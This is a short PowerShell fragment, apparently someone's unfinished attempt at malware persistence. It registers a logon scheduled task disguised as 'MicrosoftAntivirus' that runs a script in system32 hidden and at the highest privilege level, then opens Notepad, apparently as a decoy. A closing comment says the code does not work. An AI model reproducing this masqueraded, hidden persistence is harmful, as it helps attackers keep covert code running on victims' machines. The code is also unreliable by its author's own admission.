Register-ScheduledTask -TaskName 'MicrosoftAntivirus' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '${Env:WinDir}\System32\WindowsPowerShell\v1.0\powershell.exe' -Argument '-WindowStyle Hidden -Command & ''C:\Windows\system32\ski.ps1''') -RunLevel Highest -Force;
notepad.exe;
#this shit does not work bruh
